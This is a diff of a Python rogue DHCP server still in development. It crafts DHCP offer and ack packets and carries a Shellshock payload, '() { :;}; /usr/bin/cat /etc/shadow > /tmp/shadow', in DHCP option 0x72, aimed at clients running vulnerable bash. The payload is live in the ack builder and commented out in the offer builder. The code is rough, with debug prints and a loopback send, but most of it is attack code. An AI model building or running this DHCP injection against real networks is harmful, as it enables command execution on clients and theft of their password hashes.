@@ -3,6 +3,7 @@ import select
 from binascii import hexlify
 import collections
 
+
 def flatten_list(ze_list):
     for sublist in ze_list:
         if isinstance(sublist, collections.Iterable) and not isinstance(sublist, (str, bytes)):
@@ -10,77 +11,65 @@ def flatten_list(ze_list):
         else:
             yield sublist
 
+
 class Listener:
     def __init__(self):
         self.client_list = []
+        self.current_discovery = []
+
         self.dhcpServer = DhcpServer()
 
         self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST,1)
+        self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 
         # self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         # self.send_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     def start(self):
 
         self.dhcp_socket.bind(('', 67))
-        # self.recv_socket.bind(('0.0.0.0', 67))
-        # self.send_socket.bind(('0.0.0.0', 68))
+        # self.dhcp_socket.listen(5)
+
 
         while True:
-            # r, w, x = select.select([self.recv_socket, self.send_socket], [], [])
-            r, w, x = select.select([self.dhcp_socket, self.dhcp_socket], [], [])
+            r, w, x = select.select([self.dhcp_socket], [], [])
             for each in r:
                 print('Recieved Something!')
                 frame, void = each.recvfrom(10000)
                 print(frame)
-                frame = hexlify(frame)
+                # frame = hexlify(frame)
 
 
-                dhcp_message = [frame[i:i+2] for i in range(0, len(frame), 2)]
+                dhcp_message = [frame[i:i+1] for i in range(0, len(frame), 1)]
                 print(dhcp_message)
 
                 # ethernet_header, ip_header, udp_header, dhcp_message = self.clean_frame(frame)
 
                 dhcpPacket = self.DhcpPacket(dhcp_message)
 
-                # check client list
-                if 'client' not in 'clien list':
-                    client = Client(dhcpPacket)  # create client
-                    self.client_list.append(client)
-                    return_offer = dhcpPacket.craft_offer()
-                    print('[+] Sending Offer')
-                    print(return_offer)
-                    exit()
-                    self.dhcp_socket.send(return_offer)
-
-                elif 'client' in 'requesting_client_list':
-                    return_ack = dhcpPacket.craft_ack()
+                # Check for current transaction
+                if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
+                    ack = dhcpPacket.craft_ack()
+                    self.dhcp_socket.send(ack)
+                    # MOVE TO CURRENT CLIENTS
                 else:
-                    pass
+                    self.current_discovery.append(dhcpPacket)
+                    offer = dhcpPacket.craft_offer()
+                    print(offer)
+                    self.dhcp_socket.sendto(offer, ('127.0.0.1', 67))
 
-    # def clean_frame(self, frame):
-    #     # CLEANING THE FRAME MAY NOT BE NECESARY
-    #     frame = frame.split(b'\\x')
-    #
-    #     frame = [x for x in frame if x is not b'']
-    #
-    #     print(frame)
-    #     print('\n')
-    #     print(len(frame))
-    #     ethernet_header, ip_header, udp_header, dhcp_discover = frame[0:14], frame[14:34], frame[34:42], frame[42:-1]
-    #     return ethernet_header, ip_header, udp_header, dhcp_discover
-
+                    # MOVE CLIENT TO CURRENT REQUESTS
 
 
     class DhcpPacket:
         def __init__(self, dhcp_message):
             print(dhcp_message)
             print(len(dhcp_message))
-            self.exploit = hexlify(b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow")
-            self.exploit = [self.exploit[i:i+2] for i in range(0, len(self.exploit),2)]
+            self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls"  # % (self.ip, self.port)
+            self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
             print(self.exploit)
-            self.exploit_len = len(self.exploit)
-            self.exploit_len = b'%x' % self.exploit_len
+            print(len(self.exploit))
+            self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')
+            print(self.exploit_len)
 
             frame = dhcp_message
 
@@ -127,9 +116,9 @@ class Listener:
             self.ack = None
 
         def craft_offer(self):
-            op = [b'02']  # REquest=ff or reply=00
-            htype = [b'01']  # Hardware address type 01=ethernet
-            hlen = [b'06']  # Hardware length
+            op = [b'\x02']  # request=01 or reply=02
+            htype = [b'\x01']  # Hardware address type 01=ethernet
+            hlen = [b'\x06']  # Hardware length
             hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
             xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
             secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
@@ -143,48 +132,35 @@ class Listener:
             chaddr = self.chaddr  # client hardware address
             sname = self.sname  # server host name
             file = self.file  # bootfile name, routing information defined by server to the client
-            options = [b'35', b'01', b'05',  # DHCP, len, Offer
-                       b'01', b'04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
-                       b'3a', b'04', b'00', b'00' b'07', b'08',  # Renewel time
-                       b'3b', b'04', b'00', b'00', b'07', b'08',  # rebind time value
-                       b'33', b'04', b'00', b'00', b'0e', b'10',  # lease time
-                       b'36', b'04', b'c0', b'a8', b'6e', b'17', # DHCP server identifier (ip address)
-                       b'72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
-                       b'ff',  # end flag
+            magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
+            options = [b'\x35', b'\x01', b'\x02',  # DHCP, len, Offer
+                       b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
+                       b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
+                       b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
+                       b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
+                       b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17', # DHCP server identifier (ip address)
+                       # b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
+                       b'\xff',  # end flag
                        # padding to end at word boundry for the options
                        ]
 
             options = list(flatten_list(options))
 
-            options_padding_check = len(options)
-            options_padding_length = 0
-            while (options_padding_check/4) != int(options_padding_check/4):
-                options_padding_check += 1
-                options_padding_length += 1
-
-            print(options_padding_length/4)
-            if options_padding_length > 1:
-                options_padding = [[b'00']*(options_padding_length-1),[b'0a']]
-                options_padding = list(flatten_list(options_padding))
-
-                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname, file, options, options_padding]
-
-            else:
-                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
-                                 file, options]
+            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
+                             file, magic_cookie, options]
             print(return_packet)
-
 
             return_packet = [item for sublist in return_packet for item in sublist]
             print(return_packet)
-            return (return_packet)
+            return_packet = b''.join(return_packet)
+            return return_packet
 
         def craft_ack(self):
 
             # binary
-            op = [b'02']  # REquest or reply
-            htype = [b'01']  # Hardware address type
-            hlen = [b'06']  # Hardware length
+            op = [b'\x02']  # REquest or reply
+            htype = [b'\x01']  # Hardware address type
+            hlen = [b'\x06']  # Hardware length
             hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
             xid = self.xid  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
             secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
@@ -196,41 +172,28 @@ class Listener:
             chaddr = self.chaddr  # client hhardware address
             sname = self.sname  # server host name
             file = self.file  # bootfile name, routing information defined by server to the client
-            options = [ b'35', b'01', b'05',  # DHCP, len, Offer
-                        b'01', b'04', b'ff', b'ff', b'ff', b'00',  # subnetmask flag on, len=4, subnetmask
-                        b'3a', b'04', b'00', b'00' b'07', b'08', # Renewel time
-                        b'3b', b'04', b'00', b'00', b'07', b'08', #rebind time value ////CHECK T?HIS
-                        b'33', b'04', b'00', b'00', b'0e', b'10',  # lease time
-                        b'36', b'04', b'c0', b'a8', b'6e', b'17',#DHCP ID (server ip)
-                        b'72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
-                        b'ff',  # end flag
-                        # padding for word boundries
-                        ]
+            magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
+            options = [b'\x35', b'\x01', b'\x05',  # DHCP, len, Offer
+                       b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
+                       b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
+                       b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
+                       b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
+                       b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17',  # DHCP server identifier (ip address)
+                       b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
+                       b'\xff',  # end flag
+                       # padding to end at word boundry for the options
+                       ]
 
             options = list(flatten_list(options))
 
-            options_padding_check = len(options)
-            options_padding_length = 0
-            while (options_padding_check / 4) != int(options_padding_check / 4):
-                options_padding_check += 1
-                options_padding_length += 1
-
-            print(options_padding_length / 4)
-            if options_padding_length > 1:
-                options_padding = [[b'00'] * (options_padding_length - 1), [b'0a']]
-                options_padding = list(flatten_list(options_padding))
-
-                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
-                                 file, options, options_padding]
-
-            else:
-                return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
-                                 file, options]
+            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
+                             file, magic_cookie, options]
             print(return_packet)
 
             return_packet = [item for sublist in return_packet for item in sublist]
             print(return_packet)
-            return (return_packet)
+            return_packet = b''.join(return_packet)
+            return return_packet
 
         def breakup_options(self, option_string):
             print('[+] breaking up options')
@@ -242,16 +205,18 @@ class Listener:
                 # try:
                 flag = option_string[cur]
                 print('[Flag] %s' % str(flag))
-                if flag == b'ff':
+                if flag == b'\xff':
                     break
                 cur += 1
                 length = option_string[cur]
                 print('[Length] %s' % str(length))
                 cur += 1
                 # TURN LENGTH INTO AN INT
-                values = option_string[cur:int(length, 16) + cur]
+                values = option_string[cur:ord(length) + cur]
+                #values = option_string[cur:int(length, 16) + cur]
                 print('[Values] %s' % str(values))
-                cur += int(length, 16)
+                #cur += int(length, 16)
+                cur += ord(length)
 
                 option = self.Option(flag, length, values)
                 options.append(option)
@@ -283,11 +248,11 @@ class Client:
 
 class DhcpServer:
     def __init__(self):
-        self.server_ip = (b'co', b'a8', b'6e', b'17')
-        self.server_name = (b'6c', b'61', b'70', b'70', b'79')
+        self.server_ip = (b'\xc0', b'\xa8', b'\x6e', b'\x17')
+        self.server_name = (b'\x6c', b'\x61', b'\x70', b'\x70', b'\x79')
 
-        self.client_ip_available = [(b'c0', b'a8', b'00', b'01'), (b'c0', b'a8', b'00', b'02')]
-        self.client_subnet = (b'ff', b'ff', b'ff', b'00')
+        self.client_ip_available = [(b'\xc0', b'\xa8', b'\x00', b'\x01'), (b'\xc0', b'\xa8', b'\x00', b'\x02')]
+        self.client_subnet = (b'\xff', b'\xff', b'\xff', b'\x00')
 
     def get_next_ip(self):
         ip = self.client_ip_available.pop()
